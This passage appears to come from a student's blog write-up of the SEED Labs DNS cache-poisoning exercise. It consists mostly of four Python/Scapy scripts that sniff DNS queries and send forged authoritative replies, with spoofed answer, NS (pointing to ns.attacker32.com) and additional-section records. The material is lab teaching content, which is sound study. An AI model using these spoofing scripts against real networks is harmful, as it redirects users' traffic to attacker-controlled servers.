+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;2.2.2.2&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">0</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Task3</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.3.3.3&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">1</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Task4</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;4.4.4.4&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        NSsec2 = DNSRR(rrname=<span class="string">&#x27;google.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1/NSsec2)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        spoofpkt.show() <span class="comment"># show spoof pkt</span></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure>
+
+
+
+<p>Task5</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.5.5.5&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com.&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com.&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.example.com&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Additional Section</span></span><br><span class="line">        Addsec1 = DNSRR(rrname=<span class="string">&#x27;ns.attacker32.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">        Addsec2 = DNSRR(rrname=<span class="string">&#x27;ns.example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.6.7.8&#x27;</span>)</span><br><span class="line">        Addsec3 = DNSRR(rrname=<span class="string">&#x27;www.facebook.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.4.5.6&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">3</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2/Addsec3)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        spoofpkt.show() <span class="comment"># show spoof pkt</span></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/seedlab2-0/" rel="tag"># seedlab2.0</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/11/Scripts/" rel="prev" title="Scripts">
+      <i class="fa fa-chevron-left"></i> Scripts
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/30/buffer_overflow/" rel="next" title="Buffer Overflow Attack Lab (Set-UID Version)">
+      Buffer Overflow Attack Lab (Set-UID Version) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87"><span class="nav-number">1.</span> <span class="nav-text">一.实验目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">二.实验原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-DNS%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 DNS协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%8B%93%E6%89%91%E6%90%AD%E5%BB%BA"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 拓扑搭建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E5%99%A8%E6%9D%90"><span class="nav-number">3.</span> <span class="nav-text">三.实验器材</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%E5%8F%8A%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">4.</span> <span class="nav-text">四.实验步骤及运行结果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-Task-1-Directly-Spoofing-Response-to-User"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 Task 1: Directly Spoofing Response to User</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-Task-2-DNS-Cache-Poisoning-Attack-%E2%80%93-Spoofing-Answers"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 Task 2: DNS Cache Poisoning Attack – Spoofing Answers</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-Task-3-Spoofing-NS-Records"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 Task 3: Spoofing NS Records</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-Task-4-Spoofing-NS-Records-for-Another-Domain"><span class="nav-number">4.4.</span> <span class="nav-text">4.4 Task 4: Spoofing NS Records for Another Domain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-Task-5-Spoofing-Records-in-the-Additional-Section"><span class="nav-number">4.5.</span> <span class="nav-text">4.5 Task 5: Spoofing Records in the Additional Section</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94-%E9%99%84%E4%BB%B6"><span class="nav-number">5.</span> <span class="nav-text">五.附件</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Crazyoo"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Crazyoo</p>
+  <div class="site-description" itemprop="description">You get what you get.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Crazyoo</span>
+</div>
+
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div> -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
